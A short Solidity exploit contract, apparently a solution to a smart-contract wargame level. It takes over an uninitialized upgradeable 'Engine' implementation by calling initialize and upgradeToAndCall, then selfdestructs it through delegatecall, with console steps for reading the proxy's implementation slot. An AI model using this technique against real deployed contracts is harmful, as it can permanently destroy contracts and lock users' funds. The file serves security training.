// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IEngine {
    function upgrader() external view returns (address);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Hack {
    function attack(address target) external {
        IEngine engine = IEngine(target);
        
        // Initialize if not already initialized
        try engine.initialize() {} catch {}
        
        // Upgrade to this contract and call destroy()
        engine.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destroy()")
        );
    }

    function destroy() external {
        // This function will be called via delegatecall
        // So it will destroy the Engine contract, not this contract
        selfdestruct(payable(address(0)));
    }
}
    

// Get implementation(engine) address
// await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// 0x000000000000000000000000e831b5ccb9a9822062c2b944167968606b132540
// therefore, Engine is at 0xe831b5ccb9a9822062c2b944167968606b132540
